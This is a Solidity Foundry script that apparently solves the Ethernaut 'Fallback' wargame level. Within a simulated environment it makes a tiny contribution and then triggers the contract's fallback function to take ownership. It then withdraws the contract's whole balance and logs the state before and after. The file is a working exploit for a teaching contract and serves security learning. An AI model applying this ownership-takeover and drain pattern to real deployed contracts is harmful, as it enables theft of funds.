// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackHack is Script {
    Fallback public fb;
    address public eoa;

    function run() public {
        // init the eoa account
        fb = new Fallback();
        eoa = address(1024);

        vm.deal(address(fb), 1_000 ether);
        vm.deal(eoa, 10 ether);
        // print the initial infomations
        console.log("The owner of Fallback contract is:", fb.owner());
        console.log(
            "The balance of Fallback contract is:",
            address(fb).balance
        );
        console.log("The balance of EOA is:", eoa.balance);

        // starting attack
        vm.startPrank(eoa);

        fb.contribute{value: 1 wei}();
        assert(fb.getContribution() == 1 wei);

        (bool result, ) = address(fb).call{value: 1 wei}("");
        if (!result) {
            revert();
        }
        fb.withdraw();
        vm.stopPrank();

        console.log("After hacking...");
        console.log("The owner of Fallback contract is:", fb.owner());
        console.log(
            "The balance of Fallback contract is:",
            address(fb).balance
        );
        console.log("The balance of EOA is:", eoa.balance);
        vm.broadcast();
    }
}
